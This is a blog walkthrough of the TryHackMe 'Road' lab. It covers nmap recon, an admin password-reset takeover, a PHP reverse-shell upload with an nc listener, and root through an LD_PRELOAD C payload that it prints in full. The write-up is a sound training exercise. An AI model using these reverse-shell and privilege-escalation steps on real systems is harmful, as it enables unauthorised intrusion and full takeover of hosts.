---
title: Try Hack Me Road
date: 2021-11-30T15:39:49+05:30
lastmod: 2021-11-30T15:39:49+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover: /img/road.png # for tryhackMe
simg: /img/road.png

categories:
  - TryHackMe
tags:
  - tryhackme

draft: false
description: TryHackMe Room {Road} solved by Animesh Roy. this is a walkthough. read more...

---

## OverView

Inspired by a real-world pentesting engagement

|||
|---|---|
| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|Road|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/86d73ce54a3f392bd56336da012a8270.png)|
| <b> Road [FREE ROOM] </b>| [Road](https://tryhackme.com/room/road)|

## As usual, obtain the user and root flag

## Recon

### nmap

**Basic Scan[nmap]**

```bash
# Nmap 7.92 scan initiated Tue Nov 30 05:12:53 2021 as: nmap -sC -sV -oN nmap/init -vv 10.10.4.240
Nmap scan report for 10.10.4.240
Host is up, received reset ttl 60 (0.15s latency).
Scanned at 2021-11-30 05:12:54 EST for 14s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXhjztNjrxAn+QfSDb6ugzjCwso/WiGgq/BGXMrbqex9u5Nu1CKWtv7xiQpO84MsC2li6UkIAhWSMO0F//9odK1aRpPbH97e1ogBENN6YBP0s2z27aMwKh5UMyrzo5R42an3r6K+1x8lfrmW8VOOrvR4pZg9Mo+XNR/YU88P3XWq22DNPJqwtB3q4Sw6M/nxxUjd01kcbjwd1d9G+nuDNraYkA2T/OTHfp/xbhet9K6ccFHoi+A8r6aL0GV/qqW2pm4NdfgwKxM73VQzyolkG/+DFkZc+RCH73dYLEfVjMjTbZTA+19Zd2hlPJVtay+vOZr1qJ9ZUDawU7rEJgJ4hHDqlVjxX9Yv9SfFsw+Y0iwBfb9IMmevI3osNG6+2bChAtI2nUJv0g87I31fCbU5+NF8VkaGLz/sZrj5xFvyrjOpRnJW3djQKhk/Avfs2wkZ+GiyxBOZLetSDFvTAARmqaRqW9sjHl7w4w1+pkJ+dkeRsvSQlqw+AFX0MqFxzDF7M=
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBLTibnpRB37eKji7C50xC9ujq7UyiFQSHondvOZOF7fZHPDn3L+wgNXEQ0wei6gzQfiZJmjQ5vQ88vEmCZzBI=
|   256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPv3g1IqvC7ol2xMww1gHLeYkyUIe8iKtEBXznpO25Ja
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Sky Couriers
|_http-favicon: Unknown favicon MD5: FB0AA7D49532DA9D0006BA5595806138
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 30 05:13:08 2021 -- 1 IP address (1 host up) scanned in 15.23 seconds
```

* nothing special on ports.

### HTTP

we have a website running on port 80:

![img](https://i.imgur.com/FOYHX4u.png)

* let's register a account using this link  `http://10.10.4.240/v2/admin/register.html`
* login to the dashboard!
* Profile page shows us admin email.

     ![img](https://i.imgur.com/sPI35mR.png)

* intresting function with reset user password. `http://10.10.4.240/v2/ResetUser.php`
* combining both findings we can reset the password of `admin` user.

### password rest for admin

![img](https://i.imgur.com/KiqI84r.png)

* now we can login as `admin`

     ![img](https://i.imgur.com/sZr5LSM.png)

* we're admin now, and we have a file upload function. let's abuse that to get a reverse shell using `php`.

### getting reverse shell

* I'll be using kali's pre loaded php shell
  `cp /usr/share/webshells/php/php-reverse-shell.php .`
* modify the IP & port
* start the listener using `nc -lvnp PORT`
* upload the php file
* access the file, I'll be using `curl` to do so.
* glancing over source code it reveals the path where `profile pictures` are stored; `<!-- /v2/profileimages/ -->`
* `/v2/profileimages/` is not having directory listing enabled!
  
  ![img](https://i.imgur.com/8y9IuKF.png)

* as we know the `file-name` we just uploaded we can just curl that file name. 

### initial shell

![img](https://i.imgur.com/BMoP29t.png)

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## user.txt

![img](https://i.imgur.com/Y2UBz6N.png)

## priv esclation

* upon listing all running network services I can see `mongodb` (assuming based on port) running

     ![img](https://i.imgur.com/GMbKEpm.png)

* confirmed it's mongodb

     ![img](https://i.imgur.com/OJeVDEt.png)

* being total noob with mongoDB I googled a lot to find the correct way to returning data and failed. I cleaned up my session and here is the clean version of getting the password for user account:
  
  ![img](https://i.imgur.com/h0MAIO3.png)

### LP_preload

![img](https://i.imgur.com/QSIV3ab.png)

Follow this awesome [Guide](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#ld_preload-and-nopasswd) for better understanding.

### get me root

* first let's create the `root.c` file and add this shell code:

     ```bash
     #include <stdio.h>
     #include <sys/types.h>
     #include <stdlib.h>
     #include <unistd.h>
     void _init() {
          unsetenv("LD_PRELOAD");
          setgid(0);
          setuid(0);
          system("/bin/sh");
     }
     ```

* compile `gcc -fPIC -shared -o shell.so root.c -nostartfiles`
* it worked!!!

     ![img](https://i.imgur.com/4zccOMP.png)


---
<!-- Google Ads -->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->


<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<!-- EOF -->
